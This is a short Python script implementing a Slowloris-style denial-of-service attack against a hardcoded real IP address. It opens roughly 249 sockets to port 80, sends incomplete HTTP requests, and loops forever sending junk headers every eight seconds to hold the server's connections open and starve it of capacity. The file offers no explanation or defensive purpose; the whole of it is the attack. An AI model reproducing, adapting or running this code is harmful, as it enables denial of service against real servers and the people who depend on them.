import socket
from multiprocessing import Process
import random
import time

def loris():
    array_s = list(map(lambda x: socket.socket(socket.AF_INET, socket.SOCK_STREAM),
                       list(range(1,250))))

    party_packet = "GET / HTTP/1.1\n" + \
                   "Connection: Keep-Alive\n"

    for s in array_s:
        s.connect(("137.74.193.103", 80))
        s.send(party_packet)

    while 1:
        for s in array_s:
            s.send("X-a: " + str(random.randint(0, 5000)) + "\n")
        time.sleep(8)


if __name__ == "__main__":
    loris()
